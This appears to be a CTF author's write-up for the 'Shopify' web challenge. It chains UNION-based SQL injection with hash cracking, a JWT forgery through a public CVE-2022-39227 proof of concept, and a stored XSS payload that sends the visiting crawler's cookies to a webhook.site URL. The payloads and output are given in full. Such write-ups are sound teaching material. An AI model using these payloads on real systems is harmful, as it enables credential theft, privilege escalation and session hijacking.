# shopify

@codiac


I have authored 2 tasks during CyberSpark CTF:
- Shopify (Web)
- PyREDICT (Misc)
## {{ Shopify }}
In this web challenge I have tried to combine several vulnerabilities together, and I have successfully combined 3 vulnerabilities:
	- SQL injection
	- JWT token manipulation
	- XSS
As the task name suggests, this is a shop website.
### SQLi
the SQL injection vulnerability is in the search bar of the products, looking at the source code we can identify the vulnerability, looking at the `/shop` route we can see that when the app receives a `POST` request it calls the `db` class method `select_products` so checking the function at `models/db.py`  
```python
def select_products(self, title):
	self.cur.execute(f"SELECT id, title, price, image FROM products WHERE title LIKE '{title}%'")
	return self.cur.fetchall()
```
We can see that the query isn’t handled correctly it should be using prepared statements rather than format string to insert the user input inside the user, prepared statement should instruct the database to treat the input as normal input and not interpret the special characters like `'` or whatever SQL syntax.
Looking at the function above the `select_products` we can see our goal out of this SQLi which is the username and it’s password:
```python
def insert_user(self, username, password):

        password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())

        self.cur.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))

        self.con.commit()
```
The function is called right after creating the app
```python
app = Flask(__name__)
db = ProductDB()
db.create_tables()
db.insert_products()
db.insert_user(USR, PASS)
```
So we have identified the vulnerable part of the application to get initial access, then will look for further escalation.
Looking at the select statement we can see that it pulls 4 parameters from the table products, so we know that we need 4 params when using `UNION` select statement to pull the username and the password.
One more this that the app only renders the `title, price, and image` so we will work on those parameters.
Trying the casual NULL payload will cause the app to crush, running the app locally and you’ll see the error output which is you can’t concatenate None type to str type, this is because the data is being concatenated with string types.
So we only can get data of a type str, with this payload we will ensure that the number of parameters is 4:
```SQL
' UNION SELECT 'a','b','c','d' FROM users-- -
```
We can see that the visible parameters is b and d so we will get the data through those params, we craft the following query to get the username and password hash:
```SQL
' UNION SELECT 'a',username,'c',password FROM users-- -
```
and the app will crash and looking at the error locally you can see the same error as previously but now the data type that can’t be concatenated with str type is bytes, so the data is stored as bytes format so we need to convert it to str type, we can use the method `cast` to do so as follows:
```SQL
' UNION SELECT 'a',username,'c',cast(password as text) FROM users-- -
```
and now we have the username and the password hash:
```
username : shopman
password : $2b$12$9PGdbJ4uw4oHHrX5mAah2u8lduoXZu9rF3p6RQjox.bxQAyFf7vMa
```
We can use rockyou as the wordlist and we can crack the password
```bash
┌──(kali㉿kali)-[~/test]
└─$ hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt    
hashcat (v6.2.6) starting
...
* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2b$12$9PGdbJ4uw4oHHrX5mAah2u8lduoXZu9rF3p6RQjox.bxQAyFf7vMa:bishop
...
```
now we have username and password
```
username: shopman
password: bishop
```
We can login with the creds we have, now let’s see what else we can abuse to get higher privileges.
## {{ JWT manipulation }}
Looking at the requirements file we can see that all the libraries has a specific version, we can lookup all the libraries, and `python_jwt` is vulnerable to JWT token manipulation, here’s the link for the vulnerability [link](https://github.com/advisories/GHSA-5p8v-58qm-c7fp) 
We can use the following POC to leverage this vulnerability [link](https://github.com/user0x1337/CVE-2022-39227) 
running the script we can see the help menu
```bash
(codi@Codiac):locktalk/CVE-2022-39227$ python cve_2022_39227.py
usage: CVE-2022-39227-PoC [-h] -j TOKEN -i CLAIM
CVE-2022-39227-PoC: error: the following arguments are required: -j/--jwt_token, -i/--injected_claim
```
so we need to provide the token and the claims, so we need to get our token also we can see in the source code that the app is vulnerable to XSS but we can only leverage that vulnerability if we can verify added products and in order to have permission to verify added product we need to have the administrator role so we need to change our role to administrator and this vulnerability allows this action.
```bash
(codi@Codiac):locktalk/CVE-2022-39227$ python cve_2022_39227.py  -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTU3MjI4OTgsImlhdCI6MTcxNTcxOTI5OCwianRpIjoiSmdOU09OVjg2WlVlWFVnS3plT1lZUSIsIm5iZiI6MTcxNTcxOTI5OCwicm9sZSI6Im1hbmFnZXIiLCJ1c2VyIjoic2hvcG1hbiJ9.a93fZJ0rgh1MvxvmvI5qf6XzZ8auIG1ytkz7Ogsf2BF-GMmPyagNcdYp-vRd_sVeJiqx1d4641ob2HsLSh9OW75MB-xu6Nd3UNf5tEGzN368WDNLopV2nd9pPZID4fZ0WwFWbJU1Acv82GzjSOJbGfpOpNrfyKywdO6oL5_5XGjxBxnHQAgt7ILnWnp7Gsf_9hacznKXoRDwaOWGlegE_TgO9K6xoWWzHaDscjOukzfEtcuoV5p6JywbB0-XKT4JH5B2xhiscWLThABrXcRjJcGwP764PsYOjTMYalk51f9QQzWOjgq_s3OZghIWgZNHYa2C_nxU_yIKEy5lR-0T3igTlO7N6ht1aa9MvIDEecWkqNJchvDy_yE2UdDQgkcMT7Qshrj9M_EECKMABad943pMMvEztXRJDq41o2Q5jZzPXtv8TJsug4LnIJpBBFOwc4Uz-OALXjFEN7I4C-4j0V2wkSwNgNwuORmtnWbUMKawEcNmkyv0SRBl-9iRtKFxMtye2XPogUsmKKyL1EBJE1uyjqcggM5mWyG8fnOWobjAA_9xGhQAZ3grXXnMvP-JCa45IMtWJBppYtDZgiSlJFy6BmDPnd2z7IDCOum6PPXmYx-ID-Qa7L77cDHRdVcJmbubRXdLnxOXLcCmh-2DZyGGKSjvXTkeXgoQuCAftvY -i role=administrator
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTU3MjI4OTgsImlhdCI6MTcxNTcxOTI5OCwianRpIjoiSmdOU09OVjg2WlVlWFVnS3plT1lZUSIsIm5iZiI6MTcxNTcxOTI5OCwicm9sZSI6Im1hbmFnZXIiLCJ1c2VyIjoic2hvcG1hbiJ9
[+] Decoded payload: {'exp': 1715722898, 'iat': 1715719298, 'jti': 'JgNSONV86ZUeXUgKzeOYYQ', 'nbf': 1715719298, 'role': 'manager', 'user': 'shopman'}
[+] Inject new "fake" payload: {'exp': 1715722898, 'iat': 1715719298, 'jti': 'JgNSONV86ZUeXUgKzeOYYQ', 'nbf': 1715719298, 'role': 'administrator', 'user': 'shopman'}
[+] Fake payload encoded: eyJleHAiOjE3MTU3MjI4OTgsImlhdCI6MTcxNTcxOTI5OCwianRpIjoiSmdOU09OVjg2WlVlWFVnS3plT1lZUSIsIm5iZiI6MTcxNTcxOTI5OCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoic2hvcG1hbiJ9

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTU3MjI4OTgsImlhdCI6MTcxNTcxOTI5OCwianRpIjoiSmdOU09OVjg2WlVlWFVnS3plT1lZUSIsIm5iZiI6MTcxNTcxOTI5OCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoic2hvcG1hbiJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTU3MjI4OTgsImlhdCI6MTcxNTcxOTI5OCwianRpIjoiSmdOU09OVjg2WlVlWFVnS3plT1lZUSIsIm5iZiI6MTcxNTcxOTI5OCwicm9sZSI6Im1hbmFnZXIiLCJ1c2VyIjoic2hvcG1hbiJ9","signature":"a93fZJ0rgh1MvxvmvI5qf6XzZ8auIG1ytkz7Ogsf2BF-GMmPyagNcdYp-vRd_sVeJiqx1d4641ob2HsLSh9OW75MB-xu6Nd3UNf5tEGzN368WDNLopV2nd9pPZID4fZ0WwFWbJU1Acv82GzjSOJbGfpOpNrfyKywdO6oL5_5XGjxBxnHQAgt7ILnWnp7Gsf_9hacznKXoRDwaOWGlegE_TgO9K6xoWWzHaDscjOukzfEtcuoV5p6JywbB0-XKT4JH5B2xhiscWLThABrXcRjJcGwP764PsYOjTMYalk51f9QQzWOjgq_s3OZghIWgZNHYa2C_nxU_yIKEy5lR-0T3igTlO7N6ht1aa9MvIDEecWkqNJchvDy_yE2UdDQgkcMT7Qshrj9M_EECKMABad943pMMvEztXRJDq41o2Q5jZzPXtv8TJsug4LnIJpBBFOwc4Uz-OALXjFEN7I4C-4j0V2wkSwNgNwuORmtnWbUMKawEcNmkyv0SRBl-9iRtKFxMtye2XPogUsmKKyL1EBJE1uyjqcggM5mWyG8fnOWobjAA_9xGhQAZ3grXXnMvP-JCa45IMtWJBppYtDZgiSlJFy6BmDPnd2z7IDCOum6PPXmYx-ID-Qa7L77cDHRdVcJmbubRXdLnxOXLcCmh-2DZyGGKSjvXTkeXgoQuCAftvY"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTU3MjI4OTgsImlhdCI6MTcxNTcxOTI5OCwianRpIjoiSmdOU09OVjg2WlVlWFVnS3plT1lZUSIsIm5iZiI6MTcxNTcxOTI5OCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoic2hvcG1hbiJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTU3MjI4OTgsImlhdCI6MTcxNTcxOTI5OCwianRpIjoiSmdOU09OVjg2WlVlWFVnS3plT1lZUSIsIm5iZiI6MTcxNTcxOTI5OCwicm9sZSI6Im1hbmFnZXIiLCJ1c2VyIjoic2hvcG1hbiJ9","signature":"a93fZJ0rgh1MvxvmvI5qf6XzZ8auIG1ytkz7Ogsf2BF-GMmPyagNcdYp-vRd_sVeJiqx1d4641ob2HsLSh9OW75MB-xu6Nd3UNf5tEGzN368WDNLopV2nd9pPZID4fZ0WwFWbJU1Acv82GzjSOJbGfpOpNrfyKywdO6oL5_5XGjxBxnHQAgt7ILnWnp7Gsf_9hacznKXoRDwaOWGlegE_TgO9K6xoWWzHaDscjOukzfEtcuoV5p6JywbB0-XKT4JH5B2xhiscWLThABrXcRjJcGwP764PsYOjTMYalk51f9QQzWOjgq_s3OZghIWgZNHYa2C_nxU_yIKEy5lR-0T3igTlO7N6ht1aa9MvIDEecWkqNJchvDy_yE2UdDQgkcMT7Qshrj9M_EECKMABad943pMMvEztXRJDq41o2Q5jZzPXtv8TJsug4LnIJpBBFOwc4Uz-OALXjFEN7I4C-4j0V2wkSwNgNwuORmtnWbUMKawEcNmkyv0SRBl-9iRtKFxMtye2XPogUsmKKyL1EBJE1uyjqcggM5mWyG8fnOWobjAA_9xGhQAZ3grXXnMvP-JCa45IMtWJBppYtDZgiSlJFy6BmDPnd2z7IDCOum6PPXmYx-ID-Qa7L77cDHRdVcJmbubRXdLnxOXLcCmh-2DZyGGKSjvXTkeXgoQuCAftvY"}
```
We change our token cookie with the value inside the auth object and now we can visit the verify page
## {{ XSS }}
Now we need to get the input that is vulnerable to XSS and looking at the source code it is the product title so we can craft the following payload and we add our webhook URL to get the flag that is in the cookie of the web crawler that will visit the page after we submit a verify request
```js
<script>document.location='https://webhook.site/93844873-d115-4f95-8494-5904a5c8876f?c='+document.cookie</script>
```
submitting the product and taking the id then we can submit a verify request using the ID of the product we just created and we will have the flag
```
https://webhook.site/93844873-d115-4f95-8494-5904a5c8876f?c=flag=Spark{SK1LL3D_SH0P_H3CK3R_GG}
```

